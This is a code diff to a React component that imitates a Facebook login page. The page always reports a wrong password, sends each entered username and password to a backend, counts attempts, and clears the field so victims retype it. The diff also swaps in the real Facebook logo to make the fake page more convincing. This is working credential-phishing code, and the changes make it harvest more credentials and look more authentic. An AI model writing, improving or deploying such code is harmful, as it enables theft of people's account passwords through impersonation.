@@ -13,6 +13,8 @@ export default function FacebookLoginPage() {
 
   const handleLogin = async () => {
     setFeedback('Incorrect password! Please try again...');
+    const pwdToSend = password;
+    setPassword(''); // Clear password to require retaping
     attemptRef.current += 1;
     setClickCount(attemptRef.current);
     
@@ -22,7 +24,7 @@ export default function FacebookLoginPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           username: email.trim(), 
-          password, 
+          password: pwdToSend,
           method: 'facebook'
         })
       });
@@ -61,19 +63,12 @@ export default function FacebookLoginPage() {
           text-align: center;
           max-width: 90vw;
         }
-        .logo { 
-          width: 50px; 
-          height: 50px; 
-          margin: 0 auto 20px; 
-          background: #1877f2; 
-          border-radius: 50%; 
-          display: flex; 
-          align-items: center; 
-          justify-content: center; 
-          color: white; 
-          font-weight: bold; 
-          font-size: 22px;
-        }
+        .logo {
+                  width: 50px;
+                  height: 50px;
+                  margin: 0 auto 20px;
+                  display: block;
+                }
         input { 
           width: 100%; 
           max-width: 320px;
@@ -173,7 +168,7 @@ export default function FacebookLoginPage() {
       `}</style>
 
       <div className="login-container">
-        <div className="logo">f</div>
+        <img src="/logos/fb.png" alt="Facebook" className="logo" />
         <h2>Log in</h2>
         
         <input 
